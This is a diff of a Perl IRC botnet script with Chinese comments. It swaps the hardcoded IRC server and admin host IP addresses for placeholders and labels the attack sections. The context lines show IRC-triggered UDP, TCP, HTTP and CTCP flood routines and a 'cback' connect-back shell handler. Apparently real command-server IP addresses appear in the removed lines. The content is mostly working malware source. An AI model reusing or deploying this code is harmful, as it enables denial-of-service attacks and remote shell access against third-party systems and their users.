@@ -125,7 +125,7 @@ chop (my $realname = $rircname[rand scalar @rircname]); #随机生成一个realn
 
 my $nick =$rircname[rand scalar @rircname]; #随机生成一个nickname
 
-$server = '63.209.35.211' unless $server; #如果$server不存在则默认
+$server = 'xxx.xxx.xxx.xxx' unless $server; #服务器ip，如果$server不存在则默认
 my $port = '6667';# 端口
 
 my $linas_max='8'; #undefined
@@ -135,7 +135,7 @@ my $homedir = "/tmp";#工作目录
 my $version = 'gztest v1'; 
 
 my @admins = ("root","root1","root2","root3","root4"); #数组@admin
-my @hostauth = ("182.150.59.19"); #管理员host
+my @hostauth = ("xxx.xxx.xxx.xxx"); #管理员ip
 my @channels = ("#Perl"); #IRC频道
 
 my $pacotes = 1;
@@ -545,7 +545,7 @@ if ($funcarg=~ /^port\s+(.*?)\s+(.*)/ ) {
         sendraw($IRC_cur_socket, "PRIVMSG $printl : [PORT]Connection to $hostip9,$portsc ,is Refused. ");
         }
 }
-##############
+##############udp flood
 if ($funcarg =~ /^udp1\s+(.*)\s+(\d+)\s+(\d+)/) {
     return unless $pacotes;
     socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
@@ -602,7 +602,7 @@ if ($funcarg =~ /^udp3\s+(.*)\s+(\d+)\s+(\d+)/) {
 }
 ##############
 
-##############
+############## tcp flood 
 if ($funcarg =~ /^tcp\s+(.*)\s+(\d+)\s+(\d+)/) {
         sendraw($IRC_cur_socket, "PRIVMSG $printl : [TCP DDOS]Attacking".$1.":".$2." for".$3." seconds. ");
         my $itime = time;
@@ -614,7 +614,7 @@ if ($funcarg =~ /^tcp\s+(.*)\s+(\d+)\s+(\d+)/) {
 }
         sendraw($IRC_cur_socket,"PRIVMSG $printl : [TCP DDOS]Attack ended on: [*]".$1.":".$2.". ");
 }
-##############
+############## http ddos 
 if ($funcarg =~ /^http\s+(.*)\s+(\d+)/) {
         sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[HTTP DDOS]Attacking".$1." on port 80 for".$2." seconds. ");
         my $itime = time;
@@ -628,7 +628,7 @@ if ($funcarg =~ /^http\s+(.*)\s+(\d+)/) {
 }
         sendraw($IRC_cur_socket, "PRIVMSG $printl : [HTTP DDOS]Attacking ended on: [*]".$1.". ");
 }
-##############
+############## shell
 if ($funcarg =~ /^cback\s+(.*)\s+(\d+)/) {
         my $host = "$1";
         my $port = "$2";
@@ -678,7 +678,7 @@ exit;
 
 
 
-##############
+##############tcp flood 
 if ($funcarg =~ /^ctcpflood (.*)/) {
     my $target = "$1";
         sendraw($IRC_cur_socket, "PRIVMSG $printl : [IRCFlood]CTCP Flooding: [*]".$target." ");
